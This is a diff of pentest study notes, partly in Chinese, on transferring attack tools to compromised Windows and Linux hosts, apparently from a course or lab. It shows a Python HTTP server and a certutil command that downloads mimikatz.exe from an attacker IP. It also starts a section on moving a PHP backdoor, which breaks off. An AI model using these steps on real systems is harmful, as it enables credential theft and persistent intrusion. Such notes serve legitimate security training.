@@ -1,12 +1,9 @@
-# Transferring Files To Windows & Linux Targets 3
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Transferring Files To Windows & Linux Targets 3~
 	Setting Up A Web Server With Python
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		python -m SimpleHTTPServer 80
 		瀏覽器: http://ip
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ## Transferring Files To Windows Targets
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	傳輸Kali Linux 系統上/usr/share/windows-resources/mimikatz/x64目錄下的 mimikatz.exe 執行檔: 
 	cd /usr/share/windows-resources/mimikatz/x64
 	python3 -m http.server 80
@@ -17,7 +14,7 @@
 	cd Temp
 	shell
 	certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	
 ## Transferring Files To Linux Targets
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將傳輸Kali 機器上/usr/share/webshel​​ls/php/目錄下的php-backdoor.php檔案
